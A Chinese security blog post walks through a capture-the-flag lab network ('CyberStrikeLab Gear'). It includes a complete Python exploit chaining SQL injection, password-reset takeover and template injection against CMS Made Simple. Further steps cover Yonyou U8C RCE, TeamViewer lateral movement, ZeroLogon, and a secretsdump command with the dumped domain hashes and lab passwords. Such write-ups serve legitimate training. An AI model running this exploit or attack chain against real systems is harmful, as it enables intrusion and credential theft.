#  [靶场复现]CyberStrikeLab-Gear   
 sec0nd安全   2025-05-03 13:18  
  
****  
   
  
# 前言  
  
  
   
  
   
  
   
  
建议大家把公众号“**离别钩PartingHook**  
”设为星标，否则可能就看不到啦！因为公众号现在只对常读和星标的公众号才能展示大图推送。操作方法：点击右上角的【...】，然后点击【**设为星标**  
】即可。  
  
   
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdmO2NzZXc2ibYkK9unzCRx8Q1qs6TzcWUQgb06VpEqSWVYIUGm9Pib63ibibaWiaKPgLsPnxL5yTzaniaQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdqB1ibSquObljSpQibjuG4kmggMAPpHUx6mjl37SGOiaVNELIicLv7FJJfyr6DplUaSRfHZotkd7lZ9w/640?wx_fmt=png&from=appmsg "")  
  
  
  
   
  
# flag1（CMS Made Simple RCE）  
  
http://www.my.cs1ab.com/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdqB1ibSquObljSpQibjuG4kmBmsorOvPciajXJROP0Qzh0g17uCcor58dWzibhRuhMafamnxXHfxA4zQ/640?wx_fmt=png&from=appmsg "null")  
  
  
  
开局一个CMS Made Simple```
import requestsimport sysimport refrom time import sleepfrom lxml import etreedef login(s, t, usr):    uri = "%sadmin/login.php" % t    s.get(uri)    d = {        "username" : usr,        "password" : usr,        "loginsubmit" : "Submit"    }    r = s.post(uri, data=d)    match = re.search("style.php\?__c=(.*)\"", r.text)    assert match, "(-) login failed"    return match.group(1)def trigger_or_patch_ssti(s, csrf, t, tpl):    # CVE-2021-26120    d = {        "mact": 'DesignManager,m1_,admin_edit_template,0',        "__c" : csrf,        "m1_tpl" : 10,        "m1_submit" : "Submit",        "m1_name" : "Simplex",        "m1_contents" : tpl    }    r = s.post("%sadmin/moduleinterface.php" % t, files={}, data=d)    if"rce()" in tpl:        r = s.get("%sindex.php" % t)        assert ("endrce" in r.text), "(-) rce failed!"        cmdr = r.text.split("endrce")[0]        print(cmdr.strip())def determine_bool(t, exp):    p = {       "mact" : "News,m1_,default,0",       "m1_idlist": ",1)) and %s-- " % exp    }    r = requests.get("%smoduleinterface.php" % t, params=p)     return True if r.text.count("Posted by:") == 2else Falsedef trigger_sqli(t, char, sql, c_range):    # CVE-2019-9053    for i in c_range:        # <> characters are html escaped so we just have =        # substr w/ from/for because anymore commas and the string is broken up resulting in an invalid query        if determine_bool(t, ",1)) and ascii(substr((%s) from %d for 1))=%d-- " % (sql, char, i)): return chr(i)     return-1    def leak_string(t, sql, leak_name, max_length, c_range):    sys.stdout.write("(+) %s: " % leak_name)    sys.stdout.flush()    leak_string = ""    for i in range(1,max_length+1):        c = trigger_sqli(t, i, sql, c_range)        # username is probably < 25 characters        if c == -1:            break        leak_string += c        sys.stdout.write(c)        sys.stdout.flush()    assert len(leak_string) > 0, "(-) sql injection failed for %s!" % leak_name    return leak_string        def reset_pwd_stage1(t, usr):    d = {        "forgottenusername" : usr,        "forgotpwform" : 1,    }    r = requests.post("%sadmin/login.php" % t, data=d)    assert ("User Not Found" not in r.text), "(-) password reset failed!"def reset_pwd_stage2(t, usr, key):    d = {        "username" : usr,        "password" : usr,      # just reset to the username        "passwordagain" : usr, # just reset to the username        "changepwhash" : key,        "forgotpwchangeform": 1,        "loginsubmit" : "Submit",    }    r = requests.post("%sadmin/login.php" % t, data=d)    match = re.search("Welcome: <a href=\"myaccount.php\?__c=[a-z0-9]*\">(.*)<\/a>", r.text)    assert match, "(-) password reset failed!"    assert match.group(1) == usr, "(-) password reset failed!"def leak_simplex(s, t, csrf):    p = {        "mact" : "DesignManager,m1_,admin_edit_template,0",        "__c" : csrf,        "m1_tpl" : 10    }    r = s.get("%sadmin/moduleinterface.php" % t, params=p)    page = etree.HTML(r.text)    tpl = page.xpath("//textarea//text()")    assert tpl is not None, "(-) leaking template failed!"    return"".join(tpl)def remove_locks(s, t, csrf):    p = {        "mact" : "DesignManager,m1_,admin_clearlocks,0",        "__c" : csrf,        "m1_type" : "template"    }    s.get("%sadmin/moduleinterface.php" % t, params=p)def main():    if(len(sys.argv) < 4):        print("(+) usage: %s <host> <path> <cmd>" % sys.argv[0])        print("(+) eg: %s 192.168.75.141 / id" % sys.argv[0])        print("(+) eg: %s 192.168.75.141 /cmsms/ \"uname -a\"" % sys.argv[0])        return    pth = sys.argv[2]    cmd = sys.argv[3]    pth = pth + "/"if not pth.endswith("/") else pth    pth = "/" + pth if not pth.startswith("/") else pth    # target = "http://%s%s" % (sys.argv[1], pth)    target="http://www.my.cs1ab.com/"    print("(+) targeting %s" % target)    if determine_bool(target, "1=1") and not determine_bool(target, "1=2"):        print("(+) sql injection working!")    print("(+) leaking the username...")    username = "cslab"    print("\n(+) resetting the %s's password stage 1" % username)    reset_pwd_stage1(target, username)    print("(+) leaking the pwreset token...")    pwreset = leak_string(        target,        "select value from cms_userprefs where preference=0x70777265736574 and user_id=1", # qoutes will break things        "pwreset",        32, # md5 hash is always 32        list(range(48,58)) + list(range(97,103)) # charset: 0-9a-f    )    print(pwreset)    print("\n(+) done, resetting the %s's password stage 2" % username)    reset_pwd_stage2(target, username, pwreset)    session = requests.Session()    # print("(+) logging in...")    csrf = login(session, target, username)    # print("(+) leaking simplex template...")    remove_locks(session, target, csrf)    simplex_tpl = leak_simplex(session, target, csrf)    print("(+) injecting payload and executing cmd...\n")    rce_tpl = "{function name='rce(){};system(\"%s\");function '}{/function}endrce" % cmd    trigger_or_patch_ssti(session, csrf, target, rce_tpl+simplex_tpl)    while True:        r = session.get("%sindex.php" % target)        if"endrce" not in r.text:            break        trigger_or_patch_ssti(session, csrf, target, simplex_tpl)if __name__ == '__main__':    main()
```  
  
找了个脚本，但是这个脚本只能指定ip，于是就改了下，ip部分可以随便输入，直接用脚本打即可RCE，getshell之后使用badpotato提权即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdqB1ibSquObljSpQibjuG4kmgveXX6mDDen21q4QG6sT0azT8MkNxHsmpOhFsmic3QrcrHHicdCjkSiag/640?wx_fmt=png&from=appmsg "null")  
  
  
注意有Defender，需要免杀。使用mimikatz读取hash即可。# flag2（用友U8C RCE）  
  
172.10.68.30  
  
第一台主机为双网卡主机  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdqB1ibSquObljSpQibjuG4kmNP9UibzicibeVhdFrpdR3MiaCNiaL263es6sT83WXgLuQAS75EdWqGl4KBA/640?wx_fmt=png&from=appmsg "null")  
  
  
fscan扫描结果  
```
C:\Users\Administrator\Desktop>fscan64.exe -h 172.10.68.1/24   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   <\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 1.8.2start infoscan(icmp) Target 172.10.68.20    is alive(icmp) Target 172.10.68.30    is alive[*] Icmp alive hosts len is: 2172.10.68.30:8088 open172.10.68.20:3306 open172.10.68.30:445 open172.10.68.20:445 open172.10.68.30:139 open172.10.68.20:139 open172.10.68.30:135 open172.10.68.20:135 open172.10.68.20:80 open[*] alive ports len is: 9start vulscan[*] WebTitle: http://172.10.68.20       code:200 len:24     title:None[*] NetInfo:[*]172.10.68.20   [->]WIN-LL1PNMF6HNI   [->]172.10.59.35   [->]172.10.68.20[*] NetBios: 172.10.68.30    WORKGROUP\WIN-06RAOH2AQ6U           Windows Server 2016 Datacenter 14393[*] WebTitle: http://172.10.68.30:8088  code:200 len:1120   title:U8C
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdqB1ibSquObljSpQibjuG4kmZJE46udDFUc0p9wO4fr8T3r0ibicySXHYN8QQWLnJHYkrVXe1RJic7Pfg/640?wx_fmt=png&from=appmsg "null")  
  
  
直接一把梭即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdqB1ibSquObljSpQibjuG4kmRYibOiaIzWpy51PRx5gS3k0U2xgHiaVzRWgrlSOzS4EibQsaIgwaDDq0aQ/640?wx_fmt=png&from=appmsg "null")  
  
  
直接为administrator权限，直接读取flag即可。  
# flag3（TeamViewer横向移动）  
  
172.10.68.30同样为双网卡主机  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdqB1ibSquObljSpQibjuG4kmYo81mUBTrkMRhFDMPicq2Mz1vxevkUcdxY7XnwSTmkHkwdibetSSUwwA/640?wx_fmt=png&from=appmsg "null")  
  
  
使用fscan扫描10段，扫描结果为  
```
10.0.0.59:8088 open10.0.0.60:88 open10.0.0.61:445 open10.0.0.60:445 open10.0.0.58:445 open10.0.0.59:445 open10.0.0.61:139 open10.0.0.60:139 open10.0.0.58:139 open10.0.0.59:139 open10.0.0.61:135 open10.0.0.60:135 open10.0.0.58:135 open10.0.0.59:135 open[*] NetInfo:[*]10.0.0.60   [->]DC   [->]10.0.0.60[*] 10.0.0.60  (Windows Server 2016 Standard 14393)[*] NetBios: 10.0.0.58       WORKGROUP\WIN-KNETOKJEB7S           Windows Server 2016 Datacenter 14393[*] 10.0.0.61  (Windows Server 2016 Standard 14393)[*] NetBios: 10.0.0.61       cyberweb.cyberstrikelab.com         Windows Server 2016 Standard 14393[*] NetInfo:[*]10.0.0.58   [->]WIN-KNETOKJEB7S   [->]10.0.0.58[*] NetInfo:[*]10.0.0.61   [->]cyberweb   [->]10.0.0.61[*] WebTitle: http://10.0.0.59:8088     code:200 len:1120   title:U8C[+] http://10.0.0.59:8088 poc-yaml-yonyou-nc-bsh-servlet-bshservlet-rce 
```  
  
使用rdp连接到172.10.68.30后发现桌面存在pass.txt与teamviewer  
  
将内网ip尝试输入后发现10.0.0.58可以连接 tm@cslab为teamviewer密码，24d@cs1为该主机administrator密码。直接连上，读取flag即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdqB1ibSquObljSpQibjuG4kmdmeU2ZsKY2GZLd1551LV19FmRuARYCq4bkciaU6yTqr0BfkqvFFHJAQ/640?wx_fmt=png&from=appmsg "null")  
  
# flag4、flag5（zerologon）  
  
在拿下前面的主机时发现其都不在域中。只有10.0.0.60、10.0.0.61在域中且10.0.0.60为域控。10.0.0.61的主机名为cyberweb，最开始我以为其是个web系统，但是由于环境问题没有环境没有启动，重启了好几次靶机。但是也没看到其启动。那看来应该不是要打web漏洞。  
  
此时连一个域账号也没有，正常来说从域外进入域内有这么几种思路：Ldap匿名访问；域用户枚举；CVE漏洞利用  
等手段。最开始尝试连接ldap，但是没有东西。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdqB1ibSquObljSpQibjuG4kmyqK8icOpkI8JbvrHibwtnK4Y67Uyad9NichiaMfg9e4rYUEeejT3wZBJyQ/640?wx_fmt=png&from=appmsg "null")  
  
  
尝试去枚举用户名，果然发现了不一样的地方，存在cslab和tom这两个账户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdqB1ibSquObljSpQibjuG4kmwHaZSJibKgdnSgGsvRx6Eb02yJcrtZZo83q8TfvhRIiaOIQZSNR1vbVg/640?wx_fmt=png&from=appmsg "null")  
  
  
尝试使用AS-REP Roasting看看，发现不太行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdqB1ibSquObljSpQibjuG4kmbhdzgC9PdJVmicjSDjsibic6ZEDN9LsuwFUqu6VNvAEFGhFPJWu7WyJ5g/640?wx_fmt=png&from=appmsg "null")  
  
  
就去挂着去爆破了，接着尝试了很多姿势，发现zerologon是可以打的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdqB1ibSquObljSpQibjuG4kmzG5Vsl3b5iadUba8ytaxc1qQQh44cheiaUBkyfyc1Ce5l7ddk2j1f2HQ/640?wx_fmt=png&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdqB1ibSquObljSpQibjuG4km7ukkn7UHX4icCtJtaQ1B3IXLNFFJgeeDlNFXecUnTzgUMJGrUmapHXA/640?wx_fmt=png&from=appmsg "null")  
  
  
直接置空机器密码，dump出hash值  
```
proxychains python secretsdump.py cyberstrikelab.com/DC\$@10.0.60 -no-pass
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LtPy9FCOnrdqB1ibSquObljSpQibjuG4kmtmGeNygGsRsuqZshSiaLjIdA5sTjVnHZhqjbZ2IBghcWJU8nM4t1Hhw/640?wx_fmt=png&from=appmsg "null")  
  
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7b50525da0ea9349b4c698bbe4868544:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:914015901d379ce39700dfe66fb6b35d:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::cyberstrikelab.com\cslab:1106:aad3b435b51404eeaad3b435b51404ee:dac667db974d83b8892e44056066590e:::cyberstrikelab.com\Tom:1108:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::DC$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:9e83edba599dadac10fcf115f740b3d5:::[*] Kerberos keys grabbedAdministrator:aes256-cts-hmac-sha1-96:588ecc247a7ebbdb039016bc6ceda2bc81fc9d91ace90b31534220109b8095d6Administrator:aes128-cts-hmac-sha1-96:38d0f6f353cc92ea228d995071888094Administrator:des-cbc-md5:987f62c27cc49225krbtgt:aes256-cts-hmac-sha1-96:6829966a8dbb2cba19e7750b81c8e7c2b8d0852e04f5005c025ffc2c54c33835krbtgt:aes128-cts-hmac-sha1-96:fd511fa97c56fa8cfb168d8930af1731krbtgt:des-cbc-md5:e694709b4c3d7fe6cyberstrikelab.com\cslab:aes256-cts-hmac-sha1-96:422ed3eb152900be4b82cb8723fda1c165dd8de0fc391e7b495047ec0f1f7375cyberstrikelab.com\cslab:aes128-cts-hmac-sha1-96:c0f5a518ce81323271c7a025051918d2cyberstrikelab.com\cslab:des-cbc-md5:809da797df1fe97ccyberstrikelab.com\Tom:aes256-cts-hmac-sha1-96:28828e44919b9585e36d2589fab283c560344c7e6ab71a55c2758e410a653a47cyberstrikelab.com\Tom:aes128-cts-hmac-sha1-96:a42b775b632eab91fae18055794efdbdcyberstrikelab.com\Tom:des-cbc-md5:c70b0e2a979dd004DC$:aes256-cts-hmac-sha1-96:bf718fe6ea299affbc93f2f8a91d9f2ff7fe92d1073475335b24321dbaf26c5cDC$:aes128-cts-hmac-sha1-96:4ff3263bb77f8f250214fd5dd9228198DC$:des-cbc-md5:6eefc8018343380dCYBERWEB$:aes256-cts-hmac-sha1-96:2bea0015e7ae5ffac2c1742335b2af27b7735b83ca72636111ca5176e75ed935CYBERWEB$:aes128-cts-hmac-sha1-96:22844acfea6b75a8a196b3b8bd1b303bCYBERWEB$:des-cbc-md5:644fd37cb5a49edf
```  
  
直接hash传递，就获取到了两台主机的flag。  
  
预期解（猜测）  
  
后面后台爆破出了10.0.0.61的administrator密码，为qwe!@[#123]()  
，在回收箱中找到了tom的密码，也是为qwe!@[#123]()  
，就进入了域内，跑了下SharpHound.exe，发现可通过Kerberoasting去获取到账户cslab的TGS值，去爆破，然后去打非约束委派即可，但是由于靶机过期的关系没有按照这个流程去打一遍，感兴趣的师傅可以去按照这个看看能不能打通。  
  
   
  
  
  
  
  
  
